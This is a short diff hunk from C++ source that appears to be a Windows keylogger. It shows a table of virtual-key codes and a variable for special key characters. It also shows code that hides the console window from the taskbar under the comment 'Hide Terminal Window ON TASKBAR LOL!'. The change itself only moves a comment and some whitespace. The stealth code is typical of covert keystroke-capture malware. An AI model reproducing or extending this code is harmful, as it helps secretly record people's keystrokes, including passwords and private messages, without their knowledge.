@@ -71,8 +71,8 @@ int main () {
                            VK_OEM_6,VK_OEM_7,VK_OEM_8,VK_UP,VK_DOWN,VK_LEFT,VK_RIGHT};
     string specialkeychar;
     bool isspecial;
-   //Hide Terminal Window ON TASKBAR LOL!
-   
+    
+   //Hide Terminal Window ON TASKBAR LOL! 
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
 
